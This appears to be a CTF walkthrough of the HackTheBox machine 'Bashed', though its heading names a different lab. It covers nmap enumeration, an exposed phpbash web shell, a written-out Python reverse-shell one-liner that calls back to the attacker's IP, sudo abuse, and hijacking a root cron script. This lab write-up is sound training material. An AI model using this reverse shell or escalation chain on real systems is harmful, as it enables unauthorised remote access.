---
layout: page
title: Bashed - HackTheBox
permalink: /posts/ctf/hackthebox/bashed.html
---

# Debug - CyberSecLabs
----


First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 10.10.10.68`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6ebbfad0-e386-40b7-be18-d3ca512f4ffb/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6ebbfad0-e386-40b7-be18-d3ca512f4ffb/Untitled.png)

Looks like we only have one port open, lets check out the web server.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/40ef0738-f492-4480-9ff5-243cb19d867a/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/40ef0738-f492-4480-9ff5-243cb19d867a/Untitled.png)

phpbash.. interesting.  Looking into this it looks like its an open source project for interacting with the server via a web-shell.  I enumerated for directories using dirsearch to see if I could find the file.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c03db387-e1b0-4cf0-8d5f-e59bca59a924/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c03db387-e1b0-4cf0-8d5f-e59bca59a924/Untitled.png)

After checking out these directories, I found that the **/dev/** directory has the **phpbash.php** file.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/46296f2f-d97b-4a38-85b2-f8200e46477b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/46296f2f-d97b-4a38-85b2-f8200e46477b/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6017d7a-1540-4d55-8ecf-0b88342f5e09/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6017d7a-1540-4d55-8ecf-0b88342f5e09/Untitled.png)

Looks like it works, now lets try to get a reverse shell connected to our local machine so we can get an interactive shell.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2d2c4ba2-9b36-4d0a-88e0-d5a3e95108a3/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2d2c4ba2-9b36-4d0a-88e0-d5a3e95108a3/Untitled.png)

Now that we have an interactive shell, lets copy LinPEAS over and see what we find

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7fc01b68-3822-4c81-a3cb-882ab122eab0/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7fc01b68-3822-4c81-a3cb-882ab122eab0/Untitled.png)

Looks like we can run any command as **scriptmanager** with no password, so lets run **/bin/bash** to get a shell as this user.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/11e835ee-7bd7-412c-aeb1-bfed6c3cf785/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/11e835ee-7bd7-412c-aeb1-bfed6c3cf785/Untitled.png)

Now that we are the **scriptmanager** user, we can enumerate the machine to see if we can escalate to root.  After some digging we find a directory called **scripts** that has the following files.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e0673a86-ff16-46b3-acc8-21d879bcdea8/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e0673a86-ff16-46b3-acc8-21d879bcdea8/Untitled.png)

Looking at the source code of **[test.py](http://test.py)**, I see that it simply opens the file **test.txt** and writes some data in it.  However **test.txt** is owned by root, so even though we are the owner of the script, we need to run this as root to actually write to the file.  However after a few minutes we notice that the **test.txt** file has a new "last modified" time on it, indicating that we have a cron job executing the **test.py** script.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3d099987-db74-4de7-8936-283c54d11a47/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3d099987-db74-4de7-8936-283c54d11a47/Untitled.png)

Since we have write access to this file, we can modify the file to connect to our local machine.  Since this script is being run as root, we should get a shell back as root.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c3f19203-f161-47f1-9c0b-8827e7d61341/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c3f19203-f161-47f1-9c0b-8827e7d61341/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/40235990-57e0-454b-bff7-2fca34b387ee/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/40235990-57e0-454b-bff7-2fca34b387ee/Untitled.png)
